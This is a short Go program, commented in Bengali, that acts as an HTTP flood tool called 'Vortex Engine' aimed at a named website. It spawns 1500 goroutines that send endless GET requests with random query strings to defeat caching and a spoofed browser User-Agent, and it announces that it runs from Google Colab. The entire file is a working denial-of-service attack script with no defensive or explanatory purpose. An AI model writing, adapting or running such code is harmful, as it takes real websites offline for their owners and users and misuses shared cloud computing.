package main

import (
	"fmt"
	"math/rand"
	"net/http"
)

func main() {
	target := "https://www.ninjahex.com/" // টার্গেট ইউআরএল
	threads := 1500 // কোলাবের জন্য এটি বেস্ট স্পিড

	client := &http.Client{}

	fmt.Println("🚀 Vortex Engine is Firing from Google Colab!")

	for i := 0; i < threads; i++ {
		go func(id int) {
			for {
				// রেন্ডম কুয়েরি যাতে ক্যাশ ব্লক না হয়
				url := fmt.Sprintf("%s?v=%d", target, rand.Intn(999999))
				
				req, _ := http.NewRequest("GET", url, nil)
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

				resp, err := client.Do(req)
				if err == nil {
					if id == 0 {
						fmt.Printf("📡 Status: %d\n", resp.StatusCode)
					}
					resp.Body.Close()
				}
			}
		}(i)
	}
	
	// ইঞ্জিনকে চিরকাল চালু রাখার জন্য
	select {}
}
